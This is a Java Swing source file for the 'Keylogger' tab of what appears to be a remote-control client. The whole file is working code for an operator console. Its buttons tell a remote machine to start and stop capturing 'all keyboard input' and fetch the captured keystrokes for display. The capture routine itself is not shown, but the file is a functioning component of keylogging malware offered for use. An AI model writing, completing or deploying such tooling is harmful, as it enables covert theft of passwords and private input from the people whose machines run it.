package client.ui.tabs;

import common.*;
import client.ClientCore;
import org.json.JSONObject;
import javax.swing.*;
import java.awt.*;

public class KeyloggerTab extends JPanel {
    private ClientCore clientCore;
    private LogManager logger;
    private JTextArea logTextArea;
    private JButton startBtn;
    private JButton stopBtn;
    private JButton fetchBtn;
    private boolean isRunning = false;

    public KeyloggerTab(ClientCore clientCore, LogManager logger) {
        this.clientCore = clientCore;
        this.logger = logger;
        initComponents();
    }

    private void initComponents() {
        setLayout(new BorderLayout(10, 10));
        setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        // Info panel
        JPanel infoPanel = new JPanel(new BorderLayout());
        infoPanel.setBorder(BorderFactory.createTitledBorder("⌨️ Keylogger Control"));
        JLabel infoLabel = new JLabel("<html><b>Status:</b> Keylogger captures all keyboard input on the server.</html>");
        infoPanel.add(infoLabel, BorderLayout.CENTER);
        add(infoPanel, BorderLayout.NORTH);

        // Log text area
        JPanel centerPanel = new JPanel(new BorderLayout());
        centerPanel.setBorder(BorderFactory.createTitledBorder("Captured Keystrokes"));
        logTextArea = new JTextArea(20, 60);
        logTextArea.setEditable(false);
        logTextArea.setFont(new Font("Consolas", Font.PLAIN, 12));
        logTextArea.setLineWrap(true);
        logTextArea.setWrapStyleWord(true);
        centerPanel.add(new JScrollPane(logTextArea), BorderLayout.CENTER);
        add(centerPanel, BorderLayout.CENTER);

        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout());
        startBtn = new JButton("▶️ Start Keylogger");
        stopBtn = new JButton("⏹️ Stop Keylogger");
        fetchBtn = new JButton("📥 Fetch Logs");
        JButton clearBtn = new JButton("🗑️ Clear Display");

        stopBtn.setEnabled(false);

        startBtn.addActionListener(e -> startKeylogger());
        stopBtn.addActionListener(e -> stopKeylogger());
        fetchBtn.addActionListener(e -> fetchKeylog());
        clearBtn.addActionListener(e -> logTextArea.setText(""));

        buttonPanel.add(startBtn);
        buttonPanel.add(stopBtn);
        buttonPanel.add(fetchBtn);
        buttonPanel.add(clearBtn);
        add(buttonPanel, BorderLayout.SOUTH);
    }

    private void startKeylogger() {
        try {
            Message request = new Message(MessageType.REQUEST, ActionType.START_KEYLOGGER, null);
            Message response = clientCore.sendRequest(request);

            if (response.getData().getBoolean("success")) {
                isRunning = true;
                startBtn.setEnabled(false);
                stopBtn.setEnabled(true);
                logger.info("Keylogger started");
                JOptionPane.showMessageDialog(this, "Keylogger started on server!");
            }
        } catch (Exception e) {
            logger.error("Error starting keylogger", e);
            JOptionPane.showMessageDialog(this, "Error: " + e.getMessage());
        }
    }

    private void stopKeylogger() {
        try {
            Message request = new Message(MessageType.REQUEST, ActionType.STOP_KEYLOGGER, null);
            Message response = clientCore.sendRequest(request);

            if (response.getData().getBoolean("success")) {
                isRunning = false;
                startBtn.setEnabled(true);
                stopBtn.setEnabled(false);
                logger.info("Keylogger stopped");
                JOptionPane.showMessageDialog(this, "Keylogger stopped!");
            }
        } catch (Exception e) {
            logger.error("Error stopping keylogger", e);
            JOptionPane.showMessageDialog(this, "Error: " + e.getMessage());
        }
    }

    private void fetchKeylog() {
        try {
            Message request = new Message(MessageType.REQUEST, ActionType.GET_KEYLOG, null);
            Message response = clientCore.sendRequest(request);

            if (response.getData().getBoolean("success")) {
                String keylog = response.getData().optString("keylog", "");
                if (keylog.isEmpty()) {
                    logTextArea.append("[No keys captured yet]\n");
                } else {
                    logTextArea.append(keylog + "\n");
                    logTextArea.setCaretPosition(logTextArea.getDocument().getLength());
                }
                logger.info("Fetched keylog: " + keylog.length() + " chars");
            }
        } catch (Exception e) {
            logger.error("Error fetching keylog", e);
            JOptionPane.showMessageDialog(this, "Error: " + e.getMessage());
        }
    }
}
